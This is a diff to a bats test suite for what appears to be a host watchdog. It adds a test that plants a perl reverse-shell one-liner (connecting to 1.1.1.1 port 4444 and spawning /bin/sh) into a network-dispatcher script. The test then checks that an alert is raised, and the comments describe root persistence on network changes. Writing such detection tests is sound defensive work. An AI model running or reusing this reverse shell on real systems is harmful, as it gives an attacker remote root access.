@@ -294,3 +294,17 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on network-dispatcher script surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp network-
+    # dispatcher rev-shell variants. Perl on every Debian/Ubuntu
+    # host. Locks perl axis on T1546 network-event-trigger root-
+    # exec persistence — runs AS ROOT on every network state
+    # change.
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${DISPD}/99-evil"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
